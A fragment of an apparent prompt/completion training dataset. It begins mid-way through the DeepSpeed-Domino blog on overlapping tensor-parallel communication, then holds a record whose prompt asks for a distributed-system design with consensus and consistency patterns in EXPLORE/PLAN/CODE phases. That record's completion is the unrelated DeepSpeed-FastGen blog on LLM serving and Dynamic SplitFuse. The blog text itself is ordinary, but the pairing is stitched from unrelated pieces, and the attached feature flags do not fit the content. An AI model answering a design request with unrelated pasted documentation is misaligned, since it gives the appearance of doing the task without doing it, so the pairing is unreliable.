width=\"600\"><br>\n<div align=\"left\">\n\n  *Figure 5: TP Forward pass of single Self-Attention/MLP layer. (X is input, A is attention computation for Self-Attention layer and linear for MLP layer, B is linear for both Self-Attention and MLP layer. Y is X\\*A\\*B output)*\n\n</div>\n</div>\n\n\n# Domino Design\n\nCompared to Figure 5, Domino breaks data dependency of $X\\*A\\*B$ via [*Row-wise Split on Inputs X*](#row-wise-split-on-inputs-x), [*Column-wise Split on Weights B*](#column-wise-split-on-weights-b), as well as a [hybrid solution combining these two](#2d-split-on-both-x-and-b). After breaking computation into pieces, Domino pipelines computation and communication working on different independent pieces, thus achieving near-complete communication hiding behind computation. Domino's unique benefits are listed as follows:\n\n1. Comparing with GeMM+NCCL kernel fusion techniques, Domino breaks data dependency thus has a much wider range of computation kernel sequences to overlap with NCCL call. For example, Domino can overlap AllReduce not only to a single GeMM, but also extend overlapping scope to multiple GeMMs, LayerNorm, DropOut and more.\n2. Domino achieves near-complete communication hiding behind computation, thus also achieves near-optimal system throughput in certain cases. (Optimal throughput refers to end-to-end throughput that disables all communication in TP training.)\n3. Domino works at kernel scheduler level, any kernel optimizations or new kernels can be seamlessly integrated into Domino framework.\n4. Domino tensor partition scheme is simple and generic. It is easy for user side end-to-end correctness debugging when facing issues like overflow or weights/gradients errors.\n\nFor the ease of illustration, we describe forward propagation only (since backward pass is just in reverse order), and we describe only splitting tensor into two chunks.\n\n## Row-wise split on Inputs X:\n\nDomino breaks Input X in row dimension (i.e. batch dimension).\n\n<div align=\"center\">\n  <img src=\"./images/design-row.png\" width=\"600\"><br>\n\n  *Figure 6: Domino row-wise (batch-dim) split on inputs X.*\n\n</div>\n\n**Data Dependency**: Split inputs' batch dimension has no data dependency for both intra-layer and inter-layer cases. Therefore, we achieve both *intra-layer* (AllReduce($Y1$) and $X2\\*A\\*B$) and *inter-layer* (AllReduce($Y2$) and next-layer's $X1\\*A\\*B$) computation-communication overlapping. With this batch split on inputs, Domino can hide up to **100\\%** communication behind computation.\n\n## Column-wise split on Weights B:\n\nDomino breaks weight matrix B in column dimension.\n\n\n<div align=\"center\">\n  <img src=\"./images/design-column.png\" width=\"600\"><br>\n\n  *Figure 7: Domino column-wise (last-dim) split on weights B.*\n\n</div>\n\n**Data Dependency**: Split Weights B column-wise have no data dependency in intra-layer case but have data dependency in inter-layer case. Therefore, we only achieve *intra-layer*\n (AllReduce($Y1$) and $X2\\*A\\*B$) computation-communication overlapping. This column-split on weights scheme remains essential, since row-wise input split only would lead to narrow shape tensors that hinder kernel computational efficiency. In practice, Domino achieves 50\\% to 70\\% communication hiding behind computation with weights B column-wise split.\n\n## 2D Split on both X and B:\n\nFor extremely large LLMs, Domino splits both inputs X and weights B in row and column dimension, separately. This method is beneficial for model training requiring both low memory footprints and minimizing communication overheads.\n\n<div align=\"center\">\n  <img src=\"./images/design-hybrid.png\" width=\"600\"><br>\n\n  *Figure 8: Domino 2D split on both inputs X and weights B.*\n\n</div>\n\n**Data Dependency**: This 2D split policy inherits synchronization at the end of each transformer layer due to column-wise split on weights B. Therefore, the 2D approach only achieves *intra-layer* computation-communication overlapping.\n\n# Implementation and Optimization\n\nFor brevity, we summarize key implementation of row-wise input split. For more implementation details, please refer to our [arxiv paper](https://arxiv.org/abs/2409.15241).\n\n**Forward:** Figure 9 shows how we position and trigger NCCL calls in order to overlap with computation kernel sequences in forward propagation. We split batch into two chunks as $\\mu$-batch0 and $\\mu$-batch1. $\\mu$-batch0 attention output as attn0 and MLP output as MLP0. $\\mu$-batch1's attention output as attn1 and MLP output as MLP1. AllReduce(attn0) is overlapped with self-attention computation on $\\mu$-batch1. For AllReduce(attn1), we group multiple $\\mu$-batches' Dropout, Residual, LayerNorm computation-communication overlapping. This small kernel grouping not only enable complete hiding of AllReduce(attn1), but also provides proper overlapping space for AllReduce(MLP0) in the backward pass shown in Figure 10. For AllReduce(MLP0), we hide it behind $\\mu$-batch1's MLP computation kernel sequence of GeMM + GeLU + GeMM. For AllReduce(MLP1), we hide it behind next layer's attention computation.\n\n<div align=\"center\">\n  <img src=\"./images/implement-fwd.png\" width=\"700\"><br>\n\n  *Figure 9: Transformer block (i.e., 1 self-attn + 1 MLP) forward pass. Upper figure is vanila TP implementation, bottom is Domino implementation.*\n\n</div>\n\n**Backward:** Figure 10 shows a simple example of batch split in to two $\\mu$-batches as $\\mu$-batch0 and $\\mu$-batch1. Besides similar overlapping strategy in the forward pass, we extend the scope of overlap communication with weights' gradient computation inside same $\\mu$-batch (e.g., AllReduce(MLP1) partially overlaps with its own $\\mu$-batch1 computation as the 3rd orange block from left). Each *grad matmul* includes two separate GeMM computation for inputs gradient and weights gradient. Therefore, we can extend overlapping scope by overlapping AllReduce(MLP1) with $\\mu$-batch1's weights gradient computation.\n\nBackward is a bit more challenging because backward computation graph is automatically generated by torch.autograd(). To precisely control NCCL call triggering time, we implement a *no\\_operation* module, which obtains communication handle during forward pass and retains it for use during backward pass. Our *no\\_operation* module works seamlessly with torch.autograd(), and enable us precisely control NCCL start/end time without rewriting customized backward computation graph.\n\n<div align=\"center\">\n  <img src=\"./images/implement-bwd.png\" width=\"700\"><br>\n\n  *Figure 10: Transformer block (i.e., 1 self-attn + 1 MLP) backward pass. Upper figure is vanila TP implementation, bottom is Domino implementation.*\n\n</div>\n\n**General kernel optimizations:** We adopt general kernel-level optimization techniques. For example, we use cudaGraph to squeeze idle/bubble time between adjacent compute kernels to reduce end-to-end latency. We use CUDA multi-stream to increase parallel execution. We also leverage torch.compile() to further improve our system efficiency.\n\n# Getting Started: Try out DeepSpeed-Domino\n\nTo try out DeepSpeed-Domino, please refer to [Domino tutorial](https://github.com/deepspeedai/DeepSpeedExamples/blob/master/training/DeepSpeed-Domino/README.md) in our DeepSpeedExample repo.\n\n## Citation\n\n```\n@article{wang2024-deepspeed-domino,\n  title={{Domino: Eliminating Communication in LLM Training via Generic Tensor Slicing and Overlapping}},\n  author={Guanhua Wang and Chengming Zhang and Zheyu Shen and Ang Li and Olatunji Ruwase},\n  journal={arXiv preprint arXiv:2409.15241},\n  year={2024}\n}\n```\n\n## Acknowledgements\n\nThis work is the result of a deep collaboration between Microsoft DeepSpeed and our academia partners from University of Maryland, University of Houston. The contributors include [Guanhua Wang](https://www.microsoft.com/en-us/research/people/guanhuawang/), [Hongwei Chen](https://github.com/hwchen2017) and [Olatunji Ruwase](https://www.microsoft.com/en-us/research/people/olruwase/) from Microsoft DeepSpeed Team, [Chengming Zhang](https://chengmingzh8.github.io/) from University of Houston, [Zheyu Shen](https://www.linkedin.com/in/zheyushen/) and [Ang Li](https://www.ang-li.com/) from University of Maryland.\n", "metadata": {"source": "github.com/deepspeedai/DeepSpeed", "file_path": "blogs/deepspeed-domino/README.md", "language": "markdown", "complexity": "medium", "star_count": 39501, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": true, "line_count": 200}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "<div align=\"center\">\n\n# DeepSpeed-FastGen: High-throughput Text Generation for LLMs via MII and DeepSpeed-Inference\n\n</div>\n\n<div align=\"center\">\n <img src=\"assets/images/fastgen-hero-light.png#gh-light-mode-only\" width=\"850px\">\n <img src=\"assets/images/fastgen-hero-dark.png#gh-dark-mode-only\" width=\"850px\">\n</div>\n\n## Table of Contents\n1. [Introduction](#introduction)\n2. [Key LLM Serving Techniques](#background)\n3. [Dynamic SplitFuse: A Novel Prompt and Generation Composition Strategy](#technical-approach)\n4. [Performance Evaluation](#performance-evaluation)\n5. [DeepSpeed-FastGen: Implementation and Usage](#using-deepspeed-fastgen)\n6. [Try out DeepSpeed-FastGen](#try)\n7. [Acknowledgements](#acknowledgements)\n\n\n## 1. Introduction <a name=\"introduction\"></a>\n\nLarge language models (LLMs) like GPT-4 and LLaMA have emerged as a dominant workload in serving a wide range of applications infused with AI at every level. From general chat models to document summarization, and from autonomous driving to copilots at every layer of the software stack, the demand to deploy and serve these models at scale has skyrocketed. While frameworks like DeepSpeed, PyTorch, and several others can regularly achieve good hardware utilization during LLM training, the interactive nature of these applications and the poor arithmetic intensity of tasks like open-ended text generation have become the bottleneck for inference throughput in existing systems.\n\nTo this end, frameworks like [vLLM](https://arxiv.org/pdf/2309.06180.pdf) powered by PagedAttention and research systems like [Orca](https://www.usenix.org/system/files/osdi22-yu.pdf) have significantly improved the performance of inference for LLMs. However, these systems still struggle to provide consistent quality of service, particularly for workloads with longer prompts. These long prompt workloads are becoming increasingly important as more and more models, like [MPT-StoryWriter](https://www.mosaicml.com/blog/mpt-7b), and systems, such as [DeepSpeed Ulysses](https://github.com/deepspeedai/DeepSpeed/tree/master/blogs/deepspeed-ulysses), support context windows stretching to tens of thousands of tokens. To better understand the problem space, we provide detailed examples of how text generation works for LLMs in two distinct phases called prompt processing and generation. When systems treat them as distinct phases, generation will be preempted by prompt processing that risks breaking the service level agreements (SLAs).\n\nToday, we are glad to present DeepSpeed-FastGen, a system that overcomes these limitations by leveraging the proposed Dynamic SplitFuse technique and offers up to 2.3x higher effective throughput compared to state-of-the-art systems like vLLM. DeepSpeed-FastGen leverages the combination of DeepSpeed-MII and DeepSpeed-Inference to provide an easy-to-use serving system.\n\n**Quick Start:** Trying DeepSpeed-FastGen is as simple as installing the latest [DeepSpeed-MII](https://github.com/deepspeedai/DeepSpeed-MII) release:\n\n```bash\npip install deepspeed-mii\n```\n\nTo generate text using a simple non-persistent pipeline deployment, run the following code. For more details, please see [Section 5](#using-deepspeed-fastgen).\n\n```python\nfrom mii import pipeline\npipe = pipeline(\"mistralai/Mistral-7B-v0.1\")\noutput = pipe([\"Hello, my name is\", \"DeepSpeed is\"], max_new_tokens=128)\nprint(output)\n```\n\n## 2. Existing LLM Serving Techniques in Literature <a name=\"background\"></a>\n\nA text generation workload for a single sequence consists of two phases: 1) prompt processing, in which the user-provided text is efficiently processed as a batch of tokens to build a key-value (KV) cache for attention, and 2) token generation, which will add a single token to that cache and generate a new token. Over the course of generating a sequence of text, the model will make many forward calls to the model to generate the full sequence of text. Two major techniques have been proposed in the literature and deployed in systems that address various limitations and bottlenecks that may arise during these phases.\n\n_<b> Blocked KV Caching: </b>_\n\nvLLM identified that memory fragmentation due to large monolithic KV-caches significantly reduced the concurrency of LLM serving systems and proposed [Paged Attention](https://arxiv.org/pdf/2309.06180.pdf) to enable non-contiguous caches and increase total system throughput. Rather than assign individual variable-sized contiguous chunks of memory, the underlying storage in the KV cache is fixed-sized blocks (also known as pages). The blocked KV-cache increases system throughput by increasing the amount of potential sequence concurrency by eliminating KV-cache induced memory fragmentation. Non-contiguous KV cache implementations are also included in [HuggingFace TGI](https://github.com/huggingface/text-generation-inference) and [NVIDIA TensorRT-LLM](https://github.com/NVIDIA/TensorRT-LLM).\n\n_<b> Continuous Batching: </b>_\n\nIn the past, dynamic batching, in which a server would wait for multiple requests to process in phase with each other, was used to improve GPU utilization. However, this approach has drawbacks, as it typically requires padding inputs to identical lengths or stalling the system to wait to construct a larger batch.\n\nRecent advancement in large language model (LLM) inference and serving has been focusing on fine granularity scheduling and optimizing memory efficiency. For instance, Orca proposes _iteration-level scheduling_ (also known as continuous batching) which makes distinct scheduling decisions at each forward pass of the model. This allows requests to join/leave the batch as needed, eliminating the need for padding requests thus improving the overall throughput. In addition to Orca, continuous batching has been implemented in NVIDIA TRT-LLM, HuggingFace TGI, and vLLM.\n\nIn current systems, there are two primary approaches to implement continuous batching. In TGI and vLLM, the generation phase is preempted to perform prompt processing (called infill in TGI) before continuing with generation. In Orca, these phases are not distinguished; instead, Orca will add a prompt into the running batch so long as the total number of sequences doesn't reach a fixed bound. Both of these approaches to varying degrees need to stall generation to process long prompts (see [Section 3B](#splitfuse)).\n\nTo address these shortcomings, we propose a novel prompt and generation composition strategy, Dynamic SplitFuse.\n\n## 3. Dynamic SplitFuse: A Novel Prompt and Generation Composition Strategy<a name=\"technical-approach\"></a>\n\nDeepSpeed-FastGen is built to leverage continuous batching and non-contiguous KV caches to enable increased occupancy and higher responsivity for serving LLMs in the data center, similar to existing frameworks such as TRT-LLM, TGI, and vLLM. In order to achieve a new level of performance, DeepSpeed-FastGen introduces SplitFuse which leverages dynamic prompt and generation decomposition and unification to further improve continuous batching and system throughput.\n\n### A. Three Performance Insights\nBefore describing  Dynamic SplitFuse, we answer three key performance questions that together motivate its design.\n\n*__1. What factors impact the forward pass of a single LLM?__* In order to effectively schedule, it is necessary to understand what are the relevant independent variables the scheduling loop should control. We observe below that the composition of sequences in a forward pass (the batch size in sequences) has a negligible impact on performance compared to the raw number of tokens in the forward pass. This means an effective scheduler can be built around a single signal, the number of tokens in the forward pass.\n\n<div align=\"center\">\n<img src=\"assets/images/observation-prompt-v-latency.png\" alt=\"\" width=\"480\"/><br>\n</div>\n\n*__2. How does a model's throughput respond to changing the number of tokens in the forward pass?__* An LLM has two key operating regions with a relatively steep transition. With a small number of tokens, the GPU bottleneck is reading the model from memory and so throughput scales with the number of tokens, whereas with many tokens the model is throughput bound by compute and sees near-constant throughput.  The model should run highly efficiently if all forward passes are in the throughput-saturating region.\n\n<div align=\"center\">\n<img src=\"assets/images/observation-prompt-v-flops.png\" alt=\"\" width=\"480\"/><br>\n</div>\n\n*__3. How should a pool of tokens be scheduled across multiple forward passes?__* We observe above that for well-aligned inputs the token-throughput curve is concave, which means the second derivative is bound to be less than or equal to 0. As an example, let $f(x)$ be a concave function of latency to throughput for a given model. For a concave function $f(x)$, the following holds:\n\n  $$0 \\geq \\lim_{h \\to 0} \\frac{f(x + h) - 2f(x) + f(x - h)}{h^2}$$\n\n  $$0 \\geq f(x + h) - 2f(x) + f(x - h)$$\n\n  $$2f(x) \\geq f(x + h) + f(x - h)$$\n\nThis states that for a given pool of `2x` tokens to process, the manner that maximizes throughput is that which evenly splits them between two batches. More generally, in a system that must consume and process P tokens over F forward passes, the ideal partitioning scheme will divide them equally.\n\n### B. Dynamic SplitFuse <a name=\"splitfuse\"></a>\n\nDynamic SplitFuse is a novel token composition strategy for prompt processing and token generation. DeepSpeed-FastGen utilizes Dynamic SplitFuse to run at a consistent forward size by leveraging the capability to take partial tokens from prompts and compose this with generation. In particular, Dynamic SplitFuse performs two key behaviors:\n\n1. Long prompts are decomposed into much smaller chunks and scheduled across multiple forward passes (iterations) with only the final pass performing any generation.\n2. Short prompts will be composed to exactly fill a target token budget. Even short prompts may be decomposed to ensure the budget is precisely met and the forward sizes are well-aligned.\n\nTogether, these two techniques provide concrete benefits on all user metrics:\n\n1. *__Better Responsiveness__:* Since long prompts no longer require extremely long forward passes to process, the model will provide lower client latency. More forward passes are performed within the same window of time.\n2. *__Higher Efficiency:__* Fusion of short prompts to larger token budgets enables the model to consistently operate in the high throughput regime.\n3. *__Lower variance and better consistency:__* Since forward passes are of consistent size and forward pass size is the primary determinant of performance, the latency of each forward pass is much more consistent than competing systems as is the perceived generation frequency. There are no pre-emption or long-running prompts to increase the latency as in other prior work.\n\nConsequently, DeepSpeed-FastGen will consume tokens from incoming prompts at a rate that permits fast ongoing generation while adding tokens to the system that increase system utilization, providing lower latency and higher throughput streaming generation to all clients as compared to other state-of-the-art serving systems.\n\n<div align=\"center\">\n  <img src=\"assets/images/fastgen-overview-light.png#gh-light-mode-only\" width=\"640\">\n  <img src=\"assets/images/fastgen-overview-dark.png#gh-dark-mode-only\" width=\"640\"><br>\n\n  *Figure 1: Illustration of continuous batching strategies. Each block shows the execution of a forward pass.  An arrow indicates that the forward pass has sequences with one or more tokens generated. vLLM performs either token generations or prompt processing in a forward pass; token generation preempts prompt processing. Orca runs prompts at their complete length alongside generation. Dynamic SplitFuse performs dynamic composition of fixed-sized batches composed of both generation and prompt tokens.*\n\n</div>\n\n## 4. Performance Evaluation  <a name=\"performance-evaluation\"></a>\n\nDeepSpeed-FastGen provides state-of-the-art LLM serving performance leveraging its blocked KV cache and Dynamic SplitFuse continuous batching. We evaluate DeepSpeed-FastGen against vLLM on a range of models and hardware configurations following the benchmarking methodology discussed below.\n\n### A. Benchmarking Methodology\n\nWe use two primary quantitative schemes for measuring performance.\n\n**Throughput-Latency Curves:** Two key metrics for production readiness are throughput (measured in requests per second) and latency (the responsiveness of each request). To measure this, we instantiate multiple clients (ranging from 1 to 32) concurrently and send requests (512 in total) to the server. The resulting latency of each request is measured at the endpoint and throughput is measured by the end-to-end time to complete the experiment.\n\n**Effective Throughput:** Interactive applications, such as chat applications, can have more stringent and complex requirements than can be captured by top-level metrics like end-to-end latency. In particular, we focus on the increasingly popular chat user scenario:\n\n  1. A user initiates a task by sending a prompt.\n  2. The system processes the prompt and returns the first token.\n  3. Subsequent tokens are streamed to the user as they are produced.\n\nAt each point in this process there is an opportunity for a system to provide an adverse user experience; for example, if the first token arrives too slowly or the generation appears to stop for some time. We propose an SLA framework that considers both of these dimensions.\n\nAs the lengths of prompts and generated texts vary significantly, affecting computational costs, it is impractical to set rigid SLA values for throughput and latency. Therefore, we define the SLA for prompt latency as |tokens in prompt| / 512 seconds (= 512 tokens/s). Additionally, considering humans' reading speed, we set the SLA for generation latency on the Exponential Moving Average (EMA) to 2, 4, or 6 tokens/sec. Requests that adhere to these SLAs are deemed successful, and the throughput of these successful requests is referred to as **effective throughput**.\n\nWe evaluate vLLM and DeepSpeed-FastGen on both Llama-2 7B, Llama-2 13B, and Llama-2 70B on NVIDIA A100, H100, and A6000.\n\n### B. Throughput-Latency Analysis\n\nIn this experiment, DeepSpeed-FastGen outperforms vLLM in both throughput and latency, providing equivalent latency with greater throughput or more responsive latency and the same throughput. On Llama-2 70B with 4 A100x80GB, DeepSpeed-FastGen demonstrates up to 2x higher throughput (1.36 rps vs. 0.67 rps) at identical latency (9 seconds) or up to 50% latency reduction (7 seconds vs. 14 seconds) while achieving the same throughput (1.2 rps), as shown in Figure 2. These trends hold when evaluating Llama-2 13B as shown in Figure 3.\n\n<div align=\"center\">\n  <img src=\"assets/images/throughput_latency.png\" alt=\"\" width=\"850\"/><br>\n\n  *Figure 2: Throughput and latency of text generation using Llama 2 70B (Tensor parallelism across 4 A100-80GB GPUs). A normal distribution was applied to prompt and generation lengths with averages of 1200/2600 and 128/60, respectively, and a 30% variance*\n</div><br>\n\n<div align=\"center\">\n  <img src=\"assets/images/throughput_latency_13B_no_arrow.png\" alt=\"\" width=\"850\"/><br>\n\n  *Figure 3: Throughput and latency of text generation using Llama 2 13B (A100-80GB GPU, no tensor parallelism). A normal distribution was applied to prompt and generation lengths with averages of 1200/2600 and 60/128, respectively, and a 30% variance*\n</div>\n\n### C. Effective Throughput Analysis\n\nUnder the effective throughput analysis that considers both first token latency and the rate at which generation occurs, DeepSpeed-FastGen provides up to 2.3x higher throughput than vLLM. Figure 4 presents a comparative analysis of the effective throughputs of DeepSpeed-FastGen and vLLM. Each plotted point denotes the effective throughput derived from a specific number of clients. As we scaled the number of clients, we initially observed an increase in effective throughput. However, the latency also significantly increases as the number of clients approaches the system's capacity, causing many requests to fail in meeting the SLA. Consequently, the effective throughput will either saturate or decrease at some point. From a usability perspective, it's not particularly relevant how many clients are required to achieve the max effective throughput; the maximum point of the line is the optimal serving point.\n\n<div align=\"center\">\n  <img src=\"assets/images/effective_throughput.png\" alt=\"\" width=\"1200\" />\n\n  *Figure 4: Effective throughput of DeepSpeed-FastGen and vLLM (Llama 2 70B/A100-80GB using tensor parallelism across 4 A100-80GB GPUs. A normal distribution was applied to prompt and generation lengths with averages of 2600 and 60, respectively, and a 30% variance)*\n</div><br>\n\nWhen vLLM preempts the ongoing generation of previous requests, the generation latency experiences a notable increase. This leads to vLLM's effective throughput appearing lower than its directly measured throughput. At vLLM's peak, the effective throughput was 0.63 queries/sec and around 28% of requests failed to meet the 4 tokens/s SLA. At the same SLA, DeepSpeed-FastGen achieved 1.42 queries/sec (less than 1% of requests failed to meet the SLA), which is 2.3x higher than vLLM.\n\n### D. Token Level Timing Analysis\n\nFigure 5 displays the P50, P90, and P95 latencies of the generation processes. Both vLLM and DeepSpeed-FastGen exhibit similar P50 latencies, but vLLM demonstrates significantly higher latencies for P90 and P95.\nRegarding the P95 latencies, DeepSpeed-FastGen achieved a reduction of 3.7 times.\n\nThis discrepancy is due to a noticeable spike in vLLM's generation latency when it preempts the ongoing generation to process new prompts.\nIn contrast, DeepSpeed-FastGen typically processes the prompt and generation for previous requests concurrently, leading to much more consistent generation latency.\n\n\n<div align=\"center\">\n  <img src=\"assets/images/token_latency.png\" alt=\"\" width=\"400\"/><br>\n\n  *Figure 5: Per-Token generation Latency of Llama 2 70B/A100-80GB using tensor parallelism across 4 A100-80GB GPUs, 16 clients. A normal distribution was applied to prompt and generation lengths with averages of 2600 and 128, respectively, and a 30% variance.*\n</div><br>\n\n\n### E. Scalability using Load Balancing\n\nDeepSpeed-FastGen offers replica-level load balancing that evenly distributes requests across multiple servers, allowing you to effortlessly scale up your application.\n\nFigure 6 illustrates the scalability of DeepSpeed-FastGen when employing the load balancer and up to 16 replicas. Note that we utilized 4 A100 GPUs to compute the Llama 2 70B model. In total, we employed 8 nodes to run the 16 replicas. The results demonstrate nearly perfect scalability with DeepSpeed-FastGen.\nGiven that the throughput of a single replica is 1.46 queries/sec, the throughput with 16 replicas reaches 23.7 queries/sec, marking a linear 16x increase compared to a single replica.\n\n<div align=\"center\">\n  <img src=\"assets/images/repl_scale_llama70b_tp4_p2600g60.png\" alt=\"\" width=\"400\"/><br>\n\n  *Figure 6: Scalability using the load balancing feature. A normal distribution was applied to prompt and generation lengths with averages of 2600 and 60, respectively, and a 30% variance*<br>\n</div>\n\n### F. Other Hardware Platforms\n\nIn addition to the deep analysis on A100, we provide additional benchmarking results for H100 and A6000. The same performance trends were observed on both A6000 and H100 as A100.\n\n<div align=\"center\">\n  <img src=\"assets/images/H100_benchmark.png\" alt=\"\" width=\"800\"/><br>\n\n  *Figure 7: Throughput-latency curve and effective throughput of Llama 2 70b using 8 H100 GPUs. A normal distribution was applied to prompt and generation lengths with averages of 2600 and 60, respectively, and a 30% variance*<br>\n</div>\n\n<div align=\"center\">\n  <img src=\"assets/images/A6000_benchmark.png\" alt=\"\" width=\"800\"/><br>\n\n  *Figure 8: Throughput-latency curve and effective throughput of Llama 2 7b using A6000. A normal distribution was applied to prompt and generation lengths with averages of 2600 and 60, respectively, and a 30% variance*<br>\n</div>\n\n## 5. DeepSpeed-FastGen: Implementation and Usage  <a name=\"using-deepspeed-fastgen\"></a>\n\nDeepSpeed-FastGen is the synergistic composition of [DeepSpeed-MII](https://github.com/deepspeedai/DeepSpeed-MII) and [DeepSpeed-Inference](https://github.com/deepspeedai/DeepSpeed) as illustrated in the figure below. Together, both of these software packages provide various components of the system including the frontend APIs, the host and device infrastructure to schedule batches using Dynamic SplitFuse, optimized kernel implementations, and the tools to construct new model implementations.\n\n<div align=\"center\">\n<img src=\"assets/images/fastgen-arch-light.png#gh-light-mode-only\" width=\"800px\">\n<img src=\"assets/images/fastgen-arch-dark.png#gh-dark-mode-only\" width=\"800px\">\n</div>\n\n\nThe fastest way to get started with our alpha release of DeepSpeed-FastGen is: `pip install deepspeed-mii`.\n\nPlease follow our [Getting Started](https://github.com/deepspeedai/deepspeed-mii#getting-started-with-mii) guide for more details. For usage and reporting issues, please use the [DeepSpeed-MII Github repository](https://github.com/deepspeedai/DeepSpeed-MII).\n\n### A. Supported Models\n\nWe currently support the following model architectures in this alpha release of DeepSpeed-FastGen:\n\n* [LLaMA](https://huggingface.co/models?other=llama) and [LLaMA-2](https://huggingface.co/models?other=llama-2)\n* [Mistral](https://huggingface.co/models?other=mistral)\n* [OPT](https://huggingface.co/models?other=opt)\n* [Falcon](https://huggingface.co/models?other=falcon)\n* [Mixtral](https://huggingface.co/models?other=mixtral)\n* [Phi-2](https://huggingface.co/models?other=phi-msft)\n* [Phi-3](https://huggingface.co/models?other=phi3)\n* [Qwen](https://huggingface.co/models?other=qwen)\n* [Qwen2](https://huggingface.co/models?other=qwen2)\n* [Qwen2-MoE](https://huggingface.co/models?other=qwen2_moe)\n\nAll current models leverage [HuggingFace](https://github.com/huggingface) APIs in our backend to provide both the model weights and the model's corresponding tokenizer.\n\nWe plan to add additional models in the coming weeks and months after the initial release. If there are specific model architectures you would like supported, please [file an issue](https://github.com/deepspeedai/DeepSpeed-MII/issues) and let us know.\n\n### B. Deployment options\nAll of the examples below are runnable in [DeepSpeedExamples](https://github.com/deepspeedai/DeepSpeedExamples/tree/master/inference/mii). Once installed you have two options for deployment: an interactive non-persistent pipeline or a persistent serving deployment:\n\n#### Non-persistent pipeline\n\nThe non-persistent pipeline deployment is a great and fast way to get started and can be done with only a few lines of code. Non-persistent models are only around for the duration of the python script you are running but are useful for temporary interactive sessions.\n\n```python\nfrom mii import pipeline\npipe = pipeline(\"mistralai/Mistral-7B-v0.1\")\noutput = pipe([\"Hello, my name is\", \"DeepSpeed is\"], max_new_tokens=128)\nprint(output)\n```\n\n#### Persistent deployment\n\nA persistent deployment is ideal for use with long-running and production applications. The persistent deployment uses a lightweight GRPC server that can be created using the following 2 lines:\n\n\n```python\nimport mii\nmii.serve(\"mistralai/Mistral-7B-v0.1\")\n```\n\nThe above server can be queried by multiple clients at once thanks to the built-in load balancer from DeepSpeed-MII. Creating a client also just takes 2 lines of code:\n\n```python\nclient = mii.client(\"mistralai/Mistral-7B-v0.1\")\noutput = client.generate(\"Deepspeed is\", max_new_tokens=128)\nprint(output)\n```\n\nA persistent deployment can be terminated when it is no longer needed:\n\n```python\nclient.terminate_server()\n```\n\n### C. Advanced Installation Information\n\nFor ease of use and a significant reduction in lengthy compile times that many projects require in this space, we distribute a pre-compiled Python wheel covering the majority of our custom kernels through a new library called [DeepSpeed-Kernels](https://github.com/deepspeedai/DeepSpeed-Kernels). We have found this library to be very portable across environments with NVIDIA GPUs with compute capabilities 8.0+ (Ampere+), CUDA 11.6+, and Ubuntu 20+. In most cases, you shouldn't even need to know this library exists as it is a dependency of DeepSpeed-MII and will be installed with it. However, if for whatever reason you need to compile our kernels manually please see our [advanced installation docs](https://github.com/deepspeedai/DeepSpeed-Kernels#source).\n\n\n# 6. Try Out DeepSpeed-FastGen <a name=\"try\"></a>\nWe are very excited to share this DeepSpeed-FastGen alpha release.\n\n* To get started, please visit our GitHub page for DeepSpeed-MII: [GitHub Landing Page](https://github.com/deepspeedai/DeepSpeed-MII)\n\nDeepSpeed-FastGen is part of the bigger DeepSpeed ecosystem comprising a multitude of Deep Learning systems and modeling technologies. To learn more,\n\n* Please visit our [website](https://www.deepspeed.ai/) for detailed blog posts, tutorials, and helpful documentation.\n* You can also follow us on our [English Twitter](https://twitter.com/DeepSpeedAI), [Japanese Twitter](https://twitter.com/DeepSpeedAI_JP), and [Chinese Zhihu](https://www.zhihu.com/people/deepspeed) for latest news on DeepSpeed.\n\nDeepSpeed welcomes your contributions! We encourage you to report issues, contribute PRs, and join discussions on the [DeepSpeed GitHub](https://github.com/deepspeedai/DeepSpeed/) page. Please see our [contributing guide](https://github.com/deepspeedai/DeepSpeed/blob/master/CONTRIBUTING.md) for more details. We are open to collaborations with universities, research labs, and companies, such as those working together on deep learning research, applying DeepSpeed to empower real-world AI models and applications, and so on. For such requests (and other requests unsuitable for GitHub), please directly email to deepspeed-info@microsoft.com.\n\nThe following items are on our roadmap and we plan to engage with our community on these through our GitHub issues and PRs:\n\n- Performance improvements\n- Broader model support\n- New hardware backends through collaboration with partners\n- Release performance benchmarks (used to generate plots in this blog)\n\n**\"Star\" our [DeepSpeed GitHub](https://github.com/deepspeedai/DeepSpeed/) and [DeepSpeedMII GitHub](https://github.com/deepspeedai/DeepSpeed-MII/) repositories if you like our work!**\n\n# 7. Acknowledgements <a name=\"acknowledgements\"></a>\n\nWe would like to thank various open-source community projects including HuggingFace, vLLM, and HuggingFace TGI. We have leveraged HF APIs to support models and tokenizers in our alpha release and will continue to add more models. We especially acknowledge and thank the developers of [Flash Attention](https://github.com/Dao-AILab/flash-attention) for their great work. We have extensively leveraged FlashAttention kernels in our system with modifications that have been acknowledged in our code repositories at appropriate file headers. Finally, we want to thank the developers of [FasterTransformer](https://github.com/NVIDIA/FasterTransformer) kernels that we have used in our MoE kernels (released as part of DeepSpeed-Kernels repository).\n", "metadata": {"source": "github.com/deepspeedai/DeepSpeed", "file_path": "blogs/deepspeed-fastgen/README.md", "language": "markdown", "complexity": "complex", "star_count": 39501, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": true, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": true, "line_count": 310}, "authority_level": "high", "authentic": true}}
